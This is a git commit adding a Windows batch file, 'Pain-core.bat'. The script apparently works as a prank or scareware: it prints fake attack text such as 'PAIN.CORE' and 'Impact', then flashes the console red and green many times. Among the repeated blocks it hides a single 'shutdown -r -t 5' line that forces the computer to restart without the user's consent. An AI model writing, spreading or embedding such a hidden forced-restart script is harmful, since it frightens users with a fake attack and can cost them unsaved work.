5c4b86ca16ea3d388ee2adbd97fe1907fcb0626d
SKL281 <evibunda395@gmail.com>
2024-08-01 21:52:52 +0700

    Add files via upload

---
+++ Pain-core.bat
@@ -0,0 +1,454 @@
+@echo off
+color 0a
+
+:menu
+cls
+echo Files
+ping localhost -n 3 > nul
+cls
+echo Files..
+ping localhost -n 2 > nul
+cls
+echo Files%
+echo PAIN.CORE :"3$1~2%Fe"
+ping localhost -n 2 > nul
+echo Files%
+echo PAIN.CORE :"3$1~2%Fe"
+echo Impact {
+echo   io$[!]:Vector
+echo   io$[!]:Windows-%Port
+echo } void()
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+shutdown -r -t 5
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 4f
+echo ###()###
+ping localhost -n 1 > nul
+cls 
+color 0a
+echo ###()###
+set /p dd=
